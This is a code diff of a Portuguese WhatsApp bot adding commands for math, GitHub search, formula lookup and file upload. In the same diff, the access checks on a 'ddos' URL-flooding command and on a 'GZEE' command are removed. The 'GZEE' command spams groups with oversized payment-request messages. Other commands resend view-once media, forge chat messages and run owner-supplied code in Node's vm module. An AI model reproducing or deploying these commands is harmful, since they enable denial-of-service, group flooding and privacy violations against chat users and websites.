+low = mid;
+fa = fm;
+}
+}
+
+roots.push(Number(((low + high) / 2).toFixed(8)));
+}
+}
+
+roots = [...new Set(roots.map(String))];
+
+resultado = roots.length ? roots.join(", ") : "Não encontrei raízes simples.";
+codigo = `${eq}\n${polinomio} = 0\nx = ${resultado}`;
+
+explicacao = `Para resolver, o bot transformou a equação em uma forma igual a zero.
+
+Equação:
+${eq}
+
+Forma analisada:
+${polinomio} = 0`;
+
+curiosidade = "Resolver equações significa encontrar valores de x que tornam a igualdade verdadeira.";
+
+tabela.push(["Tipo", "Resolver equação"]);
+tabela.push(["Equação", eq]);
+tabela.push(["Complexidade", complexidade]);
+tabela.push(["Resultado", resultado]);
+
+} catch {
+resultado = "Não consegui resolver essa equação.";
+codigo = eq;
+explicacao = "A equação não pôde ser resolvida automaticamente.";
+}
+
+} else {
+tipo = "Conta numérica";
+
+const valor = math.evaluate(expr);
+
+resultado = typeof valor === "number"
+? math.format(valor, { precision: 14 })
+: String(valor);
+
+codigo = `${entrada}\n\nNormalizado:\n${expr}\n\nResultado:\n${resultado}`;
+
+explicacao = explicarNumerica(expr, resultado);
+
+curiosidade = "Em contas com `sin`, `cos` e `tan`, o mathjs usa radianos, não graus.";
+
+tabela.push(["Tipo", "Conta"]);
+tabela.push(["Expressão normalizada", expr]);
+tabela.push(["Funções usadas", detectarFuncoes(expr)]);
+tabela.push(["Complexidade", complexidade]);
+tabela.push(["Resultado", resultado]);
+}
+
+const notacao = explicarNotacao(resultado);
+
+await conn.sendRich(from, [
+
+conn.makeText(
+`# 🧮 CÁLCULO MATEMÁTICO
+
+Olá @${sender.split("@")[0]}!
+
+🔎 Pedido: *${entrada}*
+📚 Tipo: *${tipo}*
+⚡ Complexidade: *${complexidade}*
+
+## ✅ Resultado
+
+**${resultado}**`
+),
+
+conn.makeCode("Matemática", codigo),
+
+conn.makeTable(tabela),
+
+conn.makeText(
+`## 🧠 Explicação
+
+${explicacao}
+
+${notacao}
+
+## 💡 Curiosidade
+
+${curiosidade}
+
+## 📌 Dicas
+
+• Use \`*\` para multiplicar.
+• Use \`/\` para dividir.
+• Use \`sqrt(25)\` para raiz.
+• Use \`^2\` para potência.
+• Use \`sin(pi/6)\`, \`cos(pi)\`, \`tan(pi/4)\`.
+• Use \`log10(1000000)\`.
+• Use \`10% de 250\`.
+• Use \`derivada x^2 + 3x\`.
+• Use \`simplificar 2x + 3x\`.
+• Use \`resolver x^2 - 5x + 6\`.`
+)
+
+], info, [
+"RICH_RESPONSE_CODE",
+"RICH_RESPONSE_TABLE"
+]);
+
+await reagir(from, "✅");
+
+} catch (e) {
+console.log("ERRO CALC:", e);
+await reagir(from, "❌");
+reply("❌ Erro ao calcular. Verifique se a conta está correta.");
+}
+}
+break;
+
+case 'dissecar':
+case 'inspect':
+case 'raiox': {
+try {
+const ctx = info.message?.extendedTextMessage?.contextInfo;
+const citada = ctx?.quotedMessage;
+
+if (!citada) {
+return reply(`🔬 *Dissecar*
+
+Responda/marque uma mensagem com:
+${prefix + command}
+
+Eu mostro a estrutura completa dela.`);
+}
+
+await reagir(from, "🔬");
+
+function makeReplacer() {
+const vistos = new WeakSet();
+
+return (k, v) => {
+if (typeof v === "bigint") return v.toString() + "n";
+
+if (v && v.type === "Buffer" && Array.isArray(v.data)) {
+return `<Buffer ${v.data.length} bytes>`;
+}
+
+if (v instanceof Uint8Array) {
+return `<Bytes ${v.length}>`;
+}
+
+if (
+v &&
+typeof v === "object" &&
+v.low !== undefined &&
+v.high !== undefined &&
+v.unsigned !== undefined
+) {
+try {
+return Number(v.toString());
+} catch {
+return String(v);
+}
+}
+
+if (v && typeof v === "object") {
+if (vistos.has(v)) return "[Circular]";
+vistos.add(v);
+}
+
+return v;
+};
+}
+
+function procurar(obj, alvos, achados = new Set(), prof = 0) {
+if (!obj || typeof obj !== "object" || prof > 12) return achados;
+
+for (const k of Object.keys(obj)) {
+if (alvos.includes(k)) achados.add(k);
+
+const valor = obj[k];
+
+if (
+valor &&
+typeof valor === "object" &&
+!(valor instanceof Uint8Array) &&
+valor.type !== "Buffer"
+) {
+procurar(valor, alvos, achados, prof + 1);
+}
+}
+
+return achados;
+}
+
+const tipo = Object.keys(citada || {})[0] || "desconhecido";
+const stanzaId = ctx?.stanzaId || null;
+const autor = (ctx?.participant || "").split("@")[0] || "?";
+
+const original = typeof messagesCache !== "undefined" && stanzaId
+? messagesCache.get(stanzaId)
+: null;
+
+const camposNotaveis = [
+...procurar(citada, [
+"externalAdReply",
+"mediaKey",
+"viewOnceMessage",
+"viewOnceMessageV2",
+"viewOnceMessageV2Extension",
+"viewOnce",
+"mentionedJid",
+"buttonsMessage",
+"interactiveMessage",
+"nativeFlowMessage",
+"carouselMessage",
+"productMessage",
+"locationMessage",
+"contactMessage",
+"pollCreationMessage",
+"pollCreationMessageV3",
+"forwardingScore",
+"quotedMessage",
+"disappearingMode",
+"contextInfo",
+"url",
+"directPath",
+"mimetype",
+"caption"
+])
+];
+
+const ctxLimpo = { ...ctx };
+if (ctxLimpo.quotedMessage) {
+ctxLimpo.quotedMessage = '[ver "conteudo_citado" abaixo]';
+}
+
+const dump = {
+resumo: {
+tipo_da_citada: tipo,
+enviada_por: autor,
+stanzaId,
+campos_notaveis: camposNotaveis.length ? camposNotaveis : ["nenhum especial"],
+original_no_cache: !!original
+},
+conteudo_citado: citada,
+contextInfo_da_sua_mensagem: ctxLimpo,
+mensagem_original_completa: original || "fora do cache ou não capturada"
+};
+
+const texto = JSON.stringify(dump, makeReplacer(), 2);
+
+if (texto.length <= 3500) {
+await conn.sendMessage(from, {
+text: `🔬 *Dissecação da mensagem*\n\n\`\`\`json\n${texto}\n\`\`\``
+}, { quoted: info });
+} else {
+await conn.sendMessage(from, {
+document: Buffer.from(texto, "utf-8"),
+mimetype: "application/json",
+fileName: `dissecar_${tipo}.json`,
+caption:
+`🔬 *Dissecação completa*
+
+• Tipo: ${tipo}
+• Enviada por: ${autor}
+• Campos notáveis: ${camposNotaveis.join(", ") || "nenhum"}
+• Tamanho: ${texto.length} caracteres`
+}, { quoted: info });
+}
+
+await reagir(from, "✅");
+
+} catch (e) {
+console.log("ERRO DISSECAR:", e);
+await reagir(from, "❌");
+reply("❌ Não consegui dissecar essa mensagem.\n\nErro: " + (e?.message || e));
+}
+}
+break;
+
+case 'copiar':
+case 'clonar':
+case 'copy': {
+try {
+const ctx = info.message?.extendedTextMessage?.contextInfo;
+const citada = ctx?.quotedMessage;
+
+if (!citada) {
+return reply(`📋 *Copiar*
+
+Responda/marque uma mensagem com:
+${prefix + command}
+
+Eu tento clonar texto, imagem, vídeo, áudio, sticker, documento, enquete, contato, localização, botões, listas, carrossel e RICH.`);
+}
+
+await reagir(from, "📋");
+
+const stanzaId = ctx?.stanzaId || null;
+const fonteCompleta = typeof messagesCache !== "undefined" && stanzaId
+? messagesCache.get(stanzaId)
+: null;
+
+const baseMsg = fonteCompleta || citada;
+const veioDoCache = !!fonteCompleta;
+
+function desembrulhar(m) {
+let msg = m;
+for (let i = 0; i < 5 && msg; i++) {
+if (msg.viewOnceMessageV2?.message) msg = msg.viewOnceMessageV2.message;
+else if (msg.viewOnceMessageV2Extension?.message) msg = msg.viewOnceMessageV2Extension.message;
+else if (msg.viewOnceMessage?.message) msg = msg.viewOnceMessage.message;
+else if (msg.ephemeralMessage?.message) msg = msg.ephemeralMessage.message;
+else if (msg.documentWithCaptionMessage?.message) msg = msg.documentWithCaptionMessage.message;
+else break;
+}
+return msg;
+}
+
+const msg = desembrulhar(baseMsg);
+const tipo = Object.keys(msg || {})[0] || "desconhecido";
+
+const relatorio =
+`╭━━〔 📋 CLONADOR 〕━━╮
+┃ 🎯 Tipo: ${tipo}
+┃ 📡 Fonte: ${veioDoCache ? "cache completa" : "mensagem marcada"}
+╰━━━━━━━━━━━━━━━━━━╯`;
+
+async function tentarRelay() {
+const mid = crypto.randomBytes(10).toString("hex").toUpperCase();
+await conn.relayMessage(from, msg, { messageId: mid });
+}
+
+if (
+msg.interactiveMessage ||
+msg.buttonsMessage ||
+msg.templateMessage ||
+msg.listMessage ||
+msg.productMessage
+) {
+await reply(relatorio);
+
+try {
+await tentarRelay();
+await reagir(from, "✅");
+break;
+} catch (e) {
+return reply(`❌ Não consegui clonar esse RICH/interativo em raw.
+
+Erro: ${e.message}`);
+}
+}
+
+if (msg.imageMessage) {
+const o = msg.imageMessage;
+const buf = await getFileBuffer(o, "image");
+
+await conn.sendMessage(from, {
+image: buf,
+caption: o.caption ? `${relatorio}\n\n${o.caption}` : relatorio,
+mimetype: o.mimetype || "image/jpeg",
+...(o.viewOnce ? { viewOnce: true } : {})
+}, { quoted: info });
+
+await reagir(from, "✅");
+break;
+}
+
+if (msg.videoMessage) {
+const o = msg.videoMessage;
+const buf = await getFileBuffer(o, "video");
+
+await conn.sendMessage(from, {
+video: buf,
+caption: o.caption ? `${relatorio}\n\n${o.caption}` : relatorio,
+mimetype: o.mimetype || "video/mp4",
+gifPlayback: !!o.gifPlayback,
+...(o.viewOnce ? { viewOnce: true } : {})
+}, { quoted: info });
+
+await reagir(from, "✅");
+break;
+}
+
+if (msg.audioMessage) {
+const o = msg.audioMessage;
+const buf = await getFileBuffer(o, "audio");
+
+await reply(relatorio);
+
+await conn.sendMessage(from, {
+audio: buf,
+mimetype: o.mimetype || "audio/ogg; codecs=opus",
+ptt: !!o.ptt
+}, { quoted: info });
+
+await reagir(from, "✅");
+break;
+}
+
+if (msg.stickerMessage) {
+const o = msg.stickerMessage;
+const buf = await getFileBuffer(o, "sticker");
+
+try {
+if (typeof writeExifImg === "function") {
+const stickerExif = await writeExifImg(buf, {
+packname: "Zyron-MD Copy",
+author: "GzeeScriptsDev"
+});
+
+const envio = typeof stickerExif === "string"
+? { sticker: fs.readFileSync(stickerExif) }
+: { sticker: stickerExif };
+
+await conn.sendMessage(from, envio, { quoted: info });
+
+if (typeof stickerExif === "string") {
+try { fs.unlinkSync(stickerExif); } catch {}
+}
+} else {
+await conn.sendMessage(from, { sticker: buf }, { quoted: info });
+}
+} catch {
+await conn.sendMessage(from, { sticker: buf }, { quoted: info });
+}
+
+await reagir(from, "✅");
+break;
+}
+
+if (msg.documentMessage) {
+const o = msg.documentMessage;
+const buf = await getFileBuffer(o, "document");
+
+await conn.sendMessage(from, {
+document: buf,
+mimetype: o.mimetype || "application/octet-stream",
+fileName: o.fileName || "arquivo",
+caption: o.caption ? `${relatorio}\n\n${o.caption}` : relatorio
+}, { quoted: info });
+
+await reagir(from, "✅");
+break;
+}
+
+if (msg.pollCreationMessage || msg.pollCreationMessageV3) {
+const o = msg.pollCreationMessageV3 || msg.pollCreationMessage;
+const opcoes = (o.options || []).map(op => op.optionName).filter(Boolean);
+
+await reply(relatorio);
+
+await conn.sendMessage(from, {
+poll: {
+name: o.name || "Enquete",
+values: opcoes.length ? opcoes : ["Opção 1", "Opção 2"],
+selectableCount: o.selectableOptionsCount || 1
+}
+}, { quoted: info });
+
+await reagir(from, "✅");
+break;
+}
+
+if (msg.locationMessage) {
+const o = msg.locationMessage;
+
+await reply(relatorio);
+
+await conn.sendMessage(from, {
+location: {
+degreesLatitude: o.degreesLatitude,
+degreesLongitude: o.degreesLongitude
+}
+}, { quoted: info });
+
+await reagir(from, "✅");
+break;
+}
+
+if (msg.contactMessage) {
+const o = msg.contactMessage;
+
+await reply(relatorio);
+
+await conn.sendMessage(from, {
+contacts: {
+displayName: o.displayName || "Contato",
+contacts: [{ vcard: o.vcard }]
+}
+}, { quoted: info });
+
+await reagir(from, "✅");
+break;
+}
+
+const texto = msg.conversation || msg.extendedTextMessage?.text;
+
+if (texto) {
+const ctxCitado = msg.extendedTextMessage?.contextInfo || {};
+
+const payload = {
+text: `${relatorio}\n\n${texto}`
+};
+
+if (ctxCitado.externalAdReply) {
+payload.contextInfo = {
+externalAdReply: ctxCitado.externalAdReply
+};
+}
+
+if (Array.isArray(ctxCitado.mentionedJid) && ctxCitado.mentionedJid.length) {
+payload.mentions = ctxCitado.mentionedJid;
+}
+
+await conn.sendMessage(from, payload, { quoted: info });
+
+await reagir(from, "✅");
+break;
+}
+
+try {
+await reply(relatorio);
+await tentarRelay();
+await reagir(from, "✅");
+} catch (e) {
+await reagir(from, "❌");
+reply(`❌ Não consegui clonar esse tipo: *${tipo}*
+
+Use ${prefix}dissecar respondendo essa mensagem pra ver a estrutura.`);
+}
+
+} catch (e) {
+console.log("ERRO COPIAR:", e);
+await reagir(from, "❌");
+reply("❌ Não consegui copiar essa mensagem.\n\nErro: " + (e?.message || e));
+}
+}
+break;
+
+const vm = require("vm");
+
+case "teste": {
+try {
+if (!So_Dono) return reply(msg.SoDono);
+
+if (!q) return reply("Digite um código.");
+
+const sandbox = {
+conn: {
+sendMessage: (...args) => conn.sendMessage(...args),
+sendRich: (...args) => conn.sendRich(...args),
+makeText: (...args) => conn.makeText(...args),
+makeCode: (...args) => conn.makeCode(...args),
+makeTable: (...args) => conn.makeTable(...args),
+sendImage: (...args) => conn.sendImage(...args),
+sendVideo: (...args) => conn.sendVideo(...args),
+sendAudio: (...args) => conn.sendAudio(...args)
+},
+from,
+info,
+sender,
+reply,
+reagir,
+console,
+Buffer,
+setTimeout,
+clearTimeout
+};
+
+const codigo = `(async () => {
+${q}
+})()`;
+
+await vm.runInNewContext(codigo, sandbox, {
+timeout: 5000
+});
+
+} catch (e) {
+reply("❌ " + e.message);
+}
+}
+break;
+
+case 'systemzero':
+case 'josue': {
+try {
+await conn.sendMessage(from, { react: { text: "📚", key: info.key } });
+
+await conn.sendRich(from, [
+
+conn.makeText(
+`# 📚 @systemzero/baileys
+
+Fork/modificação do Baileys para criar bots WhatsApp em Node.js.
+
+Baileys usa conexão WebSocket com o WhatsApp Web, sem navegador/Selenium.`
+),
+
+conn.makeCode("bash",
+`npm install @systemzero/baileys
+
+npm install pino @hapi/boom qrcode-terminal axios`
+),
+
+conn.makeTable([
+["Recurso", "Descrição"],
+["Conexão", "Conecta no WhatsApp Web"],
+["Auth", "Salva sessão em arquivos"],
+["Mensagens", "Texto, imagem, vídeo, áudio"],
+["Grupos", "Administração e participantes"],
+["RICH", "Texto, código e tabela"],
+["Eventos", "messages.upsert, creds.update"]
+]),
+
+conn.makeText(
+`## 🚀 Conexão básica`
+),
+
+conn.makeCode("javascript",
+`const {
+default: makeWASocket,
+useMultiFileAuthState,
+DisconnectReason
+} = require("@systemzero/baileys");
+
+const pino = require("pino");
+
+async function startBot() {
+const { state, saveCreds } = await useMultiFileAuthState("./sessao");
+
+const conn = makeWASocket({
+auth: state,
+logger: pino({ level: "silent" }),
+printQRInTerminal: true
+});
+
+conn.ev.on("creds.update", saveCreds);
+
+conn.ev.on("messages.upsert", async ({ messages }) => {
+const info = messages[0];
+if (!info.message) return;
+
+const from = info.key.remoteJid;
+
+await conn.sendMessage(from, {
+text: "✅ Bot online!"
+});
+});
+}
+
+startBot();`
+),
+
+conn.makeText(
+`## 💬 Enviar mensagens`
+),
+
+conn.makeCode("javascript",
+`// Texto
+await conn.sendMessage(from, {
+text: "Olá mundo!"
+}, { quoted: info });
+
+// Imagem
+await conn.sendMessage(from, {
+image: { url: "https://exemplo.com/foto.jpg" },
+caption: "Imagem enviada"
+}, { quoted: info });
+
+// Áudio
+await conn.sendMessage(from, {
+audio: { url: "https://exemplo.com/audio.mp3" },
+mimetype: "audio/mpeg",
+ptt: false
+}, { quoted: info });`
+),
+
+conn.makeText(
+`## 🧠 RICH RESPONSE`
+),
+
+conn.makeCode("javascript",
+`await conn.sendRich(from, [
+
+conn.makeText(
+"# Título\\n\\nTexto com **negrito** e [link](https://github.com)"
+),
+
+conn.makeCode("javascript",
+"console.log('Zyron-MD')"
+),
+
+conn.makeTable([
+["Sistema", "Status"],
+["IA", "✅ Online"],
+["API", "✅ Online"]
+])
+
+], info, [
+"RICH_RESPONSE_CODE",
+"RICH_RESPONSE_TABLE"
+]);`
+),
+
+conn.makeText(
+`## 👥 Grupos`
+),
+
+conn.makeCode("javascript",
+`// Pegar metadata do grupo
+const metadata = await conn.groupMetadata(from);
+
+// Participantes
+const membros = metadata.participants;
+
+// Promover adm
+await conn.groupParticipantsUpdate(from, [user], "promote");
+
+// Rebaixar adm
+await conn.groupParticipantsUpdate(from, [user], "demote");
+
+// Remover membro
+await conn.groupParticipantsUpdate(from, [user], "remove");
+
+// Adicionar membro
+await conn.groupParticipantsUpdate(from, [numero + "@s.whatsapp.net"], "add");`
+),
+
+conn.makeText(
+`## 📌 Eventos importantes`
+),
+
+conn.makeTable([
+["Evento", "Uso"],
+["messages.upsert", "Receber mensagens"],
+["creds.update", "Salvar sessão"],
+["connection.update", "Detectar conexão"],
+["group-participants.update", "Entrada/saída de membros"],
+["contacts.update", "Atualização de contatos"]
+]),
+
+conn.makeText(
+`## 🔗 Links úteis
+
+• [📦 NPM](https://www.npmjs.com/package/@systemzero/baileys)
+• [📚 Docs Baileys](https://baileys.wiki/docs/intro)
+• [💻 GitHub Baileys](https://github.com/WhiskeySockets/Baileys)`
+)
+
+], info, [
+"RICH_RESPONSE_CODE",
+"RICH_RESPONSE_TABLE"
+]);
+
+await conn.sendMessage(from, { react: { text: "✅", key: info.key } });
+
+} catch (e) {
+console.log(e);
+reply("❌ Erro ao enviar documentação.");
+}
+}
+break;
+
+case 'formula':
+case 'formulaz': {
+try {
+if (!q?.trim()) {
+return reply(`🧮 *Exemplo:*\n${prefix + command} velocidade média\n${prefix + command} bhaskara\n${prefix + command} água`);
+}
+
+await conn.sendMessage(from, { react: { text: "🔎", key: info.key } });
+
+const GROQ_API_KEY = process.env.GROQ_API_KEY || "API_KEY_GROK";
+
+const pergunta = q.trim();
+
+const prompt = `
+Você é especialista em matemática, física, química e engenharia.
+
+Pedido do usuário: "${pergunta}"
+
+Retorne SOMENTE JSON válido:
+{
+  "titulo": "",
+  "area": "",
+  "formula_latex": "",
+  "explicacao": "",
+  "variaveis": [["Símbolo","Significado"]],
+  "exemplo": "",
+  "aplicacoes": "",
+  "curiosidade": "",
+  "observacao": ""
+}
+
+REGRAS:
+- Responda em português do Brasil.
+- Não use markdown fora do JSON.
+- exemplo deve começar direto com o cálculo, sem frases como "um exemplo de cálculo é".
+- Não use caracteres soltos no início, como "m", "xt", "-", ":".
+- formula_latex deve ser uma fórmula correta e útil sobre o pedido.
+- Se for matemática/física, retorne a fórmula principal.
+- Se for química, retorne uma representação química correta ou cálculo útil.
+- Para "água", prefira: M(H_2O)=2M(H)+M(O), não invente reação.
+- Para "ferro", prefira massa molar, densidade ou oxidação.
+- Não coloque texto perdido tipo "xt".
+- exemplo deve ser limpo, curto e resolvido.
+`;
+
+const { data } = await axios.post(
+"https://api.groq.com/openai/v1/chat/completions",
+{
+model: "llama-3.3-70b-versatile",
+messages: [
+{
+role: "system",
+content: "Responda somente JSON válido. Sem markdown. Sem texto fora do JSON."
+},
+{
+role: "user",
+content: prompt
+}
+],
+temperature: 0.1
+},
+{
+headers: {
+Authorization: `Bearer ${GROQ_API_KEY}`,
+"Content-Type": "application/json"
+},
+timeout: 30000
+}
+);
+
+let resposta = data?.choices?.[0]?.message?.content || "";
+
+resposta = resposta
+.replace(/```json/gi, "")
+.replace(/```/g, "")
+.trim();
+
+const inicio = resposta.indexOf("{");
+const fim = resposta.lastIndexOf("}");
+
+if (inicio === -1 || fim === -1) throw new Error("JSON não encontrado");
+
+resposta = resposta.slice(inicio, fim + 1);
+
+let json;
+try {
+json = JSON.parse(resposta);
+} catch {
+console.log("JSON QUEBRADO:", resposta);
+throw new Error("JSON inválido");
+}
+
+const titulo = json.titulo || "Fórmula encontrada";
+const area = json.area || "Geral";
+const latex = json.formula_latex || "Não encontrada";
+const explicacao = json.explicacao || "Sem explicação.";
+const exemplo = json.exemplo || "Sem exemplo.";
+const aplicacoes = json.aplicacoes || "Não informado.";
+const curiosidade = json.curiosidade || "Não informado.";
+const observacao = json.observacao || "Verifique sempre com seu professor ou material didático.";
+
+let tabela = Array.isArray(json.variaveis) ? json.variaveis : [
+["Símbolo", "Significado"],
+["?", String(json.variaveis || "Não informado")]
+];
+
+if (!Array.isArray(tabela[0])) {
+tabela = [
+["Símbolo", "Significado"],
+["?", String(json.variaveis || "Não informado")]
+];
+}
+
+const todaMateria = `https://www.todamateria.com.br/?s=${encodeURIComponent(pergunta)}`;
+
+await conn.sendRich(from, [
+
+conn.makeText(
+`# 🧮 ZYRON SCIENCES
+
+Olá ${pushname}!!
+
+🔎 Pedido: *${pergunta}*
+📚 Área: *${area}*
+
+## 📌 ${titulo}
+
+📘 Explicação:
+${explicacao}`
+),
+
+conn.makeCode("Fórmula", latex),
+
+conn.makeTable(tabela),
+
+conn.makeText(
+`## 🧪 Exemplo
+
+\`\`\`
+${exemplo}
+\`\`\`
+
+## 📍 Aplicações
+
+${aplicacoes}
+
+## 🧠 Curiosidade
+
+${curiosidade}
+
+## ⚠️ Observação
+
+${observacao}
+
+## 🌐 Saiba mais
+
+• [📚 Toda Matéria - ${pergunta}](${todaMateria})`
+)
+
+], info, [
+"RICH_RESPONSE_CODE",
+"RICH_RESPONSE_TABLE"
+]);
+
+await conn.sendMessage(from, { react: { text: "✅", key: info.key } });
+
+} catch (e) {
+console.log("ERRO FORMULA:", e?.response?.data || e);
+await conn.sendMessage(from, { react: { text: "❌", key: info.key } });
+reply("❌ Erro ao pesquisar fórmula.");
+}
+}
+break;
+
+case 'gitsearch':
+case 'github':
+case 'repos': {
+try {
+if (!q) {
+return reply(`🔎 *Exemplo de uso:*\n${prefix + command} Zyron-MD`);
+}
+
+await reagir(from, "🔎");
+
+const {
+generateWAMessageFromContent,
+proto
+} = require("@systemzero/baileys");
+
+const { data } = await axios.get(
+"https://api.github.com/search/repositories",
+{
+params: {
+q: q,
+sort: "stars",
+order: "desc",
+per_page: 10
+},
+headers: {
+"User-Agent": "Zyron-MD"
+}
+}
+);
+
+if (!data.items.length) {
+await reagir(from, "❌");
+return reply("❌ Nenhum repositório encontrado.");
+}
+
+const rows = data.items.map(repo => ({
+header: `⭐ ${repo.stargazers_count} • 🍴 ${repo.forks_count}`,
+title: repo.full_name,
+description: (repo.description || "Sem descrição").slice(0, 72),
+id: `${prefix}repo ${repo.full_name}`
+}));
+
+const msg = generateWAMessageFromContent(from, {
+viewOnceMessage: {
+message: {
+interactiveMessage: proto.Message.InteractiveMessage.create({
+body: {
+text: `📚 *Resultados para:* ${q}\n\nSelecione um repositório abaixo.`
+},
+footer: {
+text: "Zyron-MD • GitHub Search"
+},
+header: {
+hasMediaAttachment: false
+},
+nativeFlowMessage: {
+buttons: [{
+name: "single_select",
+buttonParamsJson: JSON.stringify({
+title: "📂 Abrir resultados",
+sections: [{
+title: "Repositórios encontrados",
+rows
+}]
+})
+}]
+}
+})
+}
+}
+}, {});
+
+await conn.relayMessage(
+from,
+msg.message,
+{
+messageId: msg.key.id
+}
+);
+
+await reagir(from, "✅");
+
+} catch (e) {
+console.log(e.response?.data || e);
+await reagir(from, "❌");
+reply("❌ Erro ao pesquisar repositórios.");
+}
+}
+break;
+
+case 'repo': {
+try {
+
+if (!q) return reply("Informe o repositório.");
+
+await reagir(from, "⏳");
+
+// CORRIGE A BARRA ESCAPADA DA LISTA
+let repoName = q
+.replace(/\\\//g, "/")
+.replace(/\s+/g, "")
+.trim();
+
+const { data } = await axios.get(
+`https://api.github.com/repos/${repoName}`,
+{
+headers: {
+"User-Agent": "Zyron-MD"
+}
+}
+);
+
+await conn.sendMessage(from, {
+text:
+`📦 *${data.full_name}*
+
+📝 ${data.description || "Sem descrição"}
+
+👤 Autor: ${data.owner.login}
+⭐ Estrelas: ${data.stargazers_count}
+🍴 Forks: ${data.forks_count}
+👀 Watchers: ${data.watchers_count}
+🐞 Issues: ${data.open_issues_count}
+💻 Linguagem: ${data.language || "Não informada"}
+
+🔗 ${data.html_url}`
+}, { quoted: info });
+
+await reagir(from, "✅");
+
+} catch (e) {
+console.log(e.response?.data || e);
+await reagir(from, "❌");
+reply("❌ Repositório não encontrado.");
 }
 }
 break;
@@ -2744,10 +12299,6 @@ break;
 case 'ddos': {
 try {
 
-if (!isVip && !isDono) {
-return reply('❌ Apenas usuários VIP podem usar este comando.');
-}
-
 const url = args[0];
 const total = parseInt(args[1]) || 100;
 const concorrencia = parseInt(args[2]) || 10;
@@ -2789,17 +12340,15 @@ reply('❌ Erro no teste.');
 break;
 
 case 'GZEE': {
-       if (!isVip && !isDono) {
-return reply('❌ Apenas usuários VIP podem usar este comando.');
-}
+
     if (!isGroup) return enviar("Este comando só pode ser usado em grupos.");
     const texto = `GZEE SCRIPTS DOMINA!!!!`.trim();
     const delay = ms => new Promise(res => setTimeout(res, ms));
     try {  
-        const metadata = await client.groupMetadata(from);  
+        const metadata = await conn.groupMetadata(from);  
         const participantes = metadata.participants.map(p => p.id);  
         for (let i = 0; i < 10; i++) {
-            await client.relayMessage(from, {  
+            await conn.relayMessage(from, {  
                 requestPaymentMessage: {  
                     currencyCodeIso4217: "BRL",  
                     amount1000: "99999999999",  
@@ -2816,7 +12365,7 @@ return reply('❌ Apenas usuários VIP podem usar este comando.');
 
             await delay(500);
 
-            await client.relayMessage(from, {
+            await conn.relayMessage(from, {
                 groupStatusMessageV2: {
                     message: {
                         requestPaymentMessage: {
@@ -2880,7 +12429,7 @@ await reagir(from, "🔎");
 
 const { prepareWAMessageMedia, generateWAMessageFromContent } = require("@systemzero/baileys");
 
-const { data } = await axios.get("https://systemzone.store/api/anime/search", {
+const { data } = await axios.get("https://zone.api.br/api/anime/search", {
 params: { q }
 });
 
@@ -3001,8 +12550,6 @@ if (!ep) return reply("❌ Episódio não encontrado.");
 const link = ep.players[0];
 
 await reagir(from, "⏳");
-
-const { prepareWAMessageMedia, generateWAMessageFromContent } = require("@systemzero/baileys");
 
 let imageMessage = null;
 try {
@@ -3552,7 +13099,6 @@ case 'revelar': {
   break;
 }
 
-case 'fakemsg':
 case 'fakechat': {
   try {
     if (!q || !q.includes('|')) {
@@ -3611,114 +13157,106 @@ break;
 
 case 'gerarlink': {
 try {
+
 await reagir(from, "⏳");
 
-async function uploadTmpFiles(buffer, filename, mimetype) {
-const form = new FormData();
-form.append('file', buffer, {
-filename,
-contentType: mimetype
-});
+const axios = require("axios");
+const FormData = require("form-data");
 
-const { data } = await axios.post('https://tmpfiles.org/api/v1/upload', form, {
-headers: form.getHeaders()
-});
+async function uploadCatbox(buffer, filename) {
+    const form = new FormData();
 
-if (!data?.data?.url) throw new Error('Falha no tmpfiles');
+    form.append("reqtype", "fileupload");
+    form.append("fileToUpload", buffer, filename);
 
-return data.data.url.replace('tmpfiles.org/', 'tmpfiles.org/dl/');
-}
+    const { data } = await axios.post(
+        "https://catbox.moe/user/api.php",
+        form,
+        {
+            headers: form.getHeaders(),
+            maxBodyLength: Infinity,
+            maxContentLength: Infinity
+        }
+    );
 
-async function uploadTelegraph(buffer, filename, mimetype) {
-const form = new FormData();
-form.append('file', buffer, {
-filename,
-contentType: mimetype
-});
+    if (typeof data !== "string" || !data.startsWith("https://")) {
+        throw new Error(data || "Falha ao enviar para o Catbox.");
+    }
 
-try {
-const { data } = await axios.post('https://telegra.ph/upload', form, {
-headers: form.getHeaders()
-});
-
-if (!data?.[0]?.src) throw new Error('Telegraph recusou');
-return `https://telegra.ph${data[0].src}`;
-
-} catch {
-return await uploadTmpFiles(buffer, filename, mimetype);
-}
+    return data.trim();
 }
 
 const quotedMsg = info?.message?.extendedTextMessage?.contextInfo?.quotedMessage;
 
 if (!quotedMsg) {
-await reagir(from, "❌");
-return reply("❌ Responda uma imagem, vídeo ou áudio.");
+    await reagir(from, "❌");
+    return reply("❌ Responda uma imagem, vídeo, áudio ou documento.");
 }
 
-const imgMsg =
-quotedMsg?.imageMessage ||
-quotedMsg?.viewOnceMessageV2?.message?.imageMessage ||
-quotedMsg?.viewOnceMessage?.message?.imageMessage;
+const media =
+    quotedMsg.imageMessage ||
+    quotedMsg.videoMessage ||
+    quotedMsg.audioMessage ||
+    quotedMsg.documentMessage ||
+    quotedMsg?.viewOnceMessage?.message?.imageMessage ||
+    quotedMsg?.viewOnceMessage?.message?.videoMessage ||
+    quotedMsg?.viewOnceMessageV2?.message?.imageMessage ||
+    quotedMsg?.viewOnceMessageV2?.message?.videoMessage;
 
-if (imgMsg) {
-const buff = await getFileBuffer(imgMsg, 'image');
-const link = await uploadTelegraph(buff, 'imagem.jpg', 'image/jpeg');
+if (!media) {
+    await reagir(from, "❌");
+    return reply("❌ Responda uma imagem, vídeo, áudio ou documento.");
+}
 
-await conn.sendMessage(from, {
-text: `🖼️ *LINK GERADO:*\n${link}`
-}, { quoted: selo });
+let tipo = "document";
+let nome = "arquivo.bin";
+
+if (quotedMsg.imageMessage || quotedMsg?.viewOnceMessage?.message?.imageMessage || quotedMsg?.viewOnceMessageV2?.message?.imageMessage) {
+    tipo = "image";
+    nome = "imagem.jpg";
+}
+
+if (quotedMsg.videoMessage || quotedMsg?.viewOnceMessage?.message?.videoMessage || quotedMsg?.viewOnceMessageV2?.message?.videoMessage) {
+    tipo = "video";
+    nome = "video.mp4";
+}
+
+if (quotedMsg.audioMessage) {
+    tipo = "audio";
+    nome = "audio.mp3";
+}
+
+if (quotedMsg.documentMessage) {
+    tipo = "document";
+    nome = quotedMsg.documentMessage.fileName || "arquivo";
+}
+
+const buffer = await getFileBuffer(media, tipo);
+
+const link = await uploadCatbox(buffer, nome);
+
+await conn.sendMessage(
+    from,
+    {
+        text: `✅ *LINK GERADO*
+
+📎 Arquivo: ${nome}
+
+🛅 Serviço: CatBox.moe
+
+🌐 ${link}`
+    },
+    {
+        quoted: selo
+    }
+);
 
 await reagir(from, "✅");
-break;
-}
-
-const vidMsg =
